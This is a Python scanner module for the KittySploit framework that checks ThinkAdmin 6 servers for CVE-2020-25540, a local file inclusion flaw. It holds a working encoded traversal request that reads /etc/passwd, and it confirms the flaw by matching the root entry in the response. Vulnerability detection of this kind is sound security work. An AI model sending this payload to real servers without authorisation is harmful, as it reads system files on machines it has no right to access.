#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkAdmin version 6 is affected by a local file inclusion vulnerability because an unauthorized attacker can ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinkAdmin 6 - Local File Inclusion Detection',
        'description': 'ThinkAdmin version 6 is affected by a local file inclusion vulnerability because an unauthorized attacker can read arbitrary files on a remote server via GET request encode parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'thinkadmin', 'lfi', 'edb', 'packetstorm', 'ctolog', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/48812',
            'https://github.com/zoujingli/ThinkAdmin/issues/244',
            'https://wtfsec.org/posts/thinkadmin-v6-%E5%88%97%E7%9B%AE%E5%BD%95-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/',
            'http://packetstormsecurity.com/files/159177/ThinkAdmin-6-Arbitrary-File-Read.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25540',
        ],
        'cve': 'CVE-2020-25540',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="ThinkAdmin 6 - Local File Inclusion detected",
                path='/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s',
            )
            return True
        return False

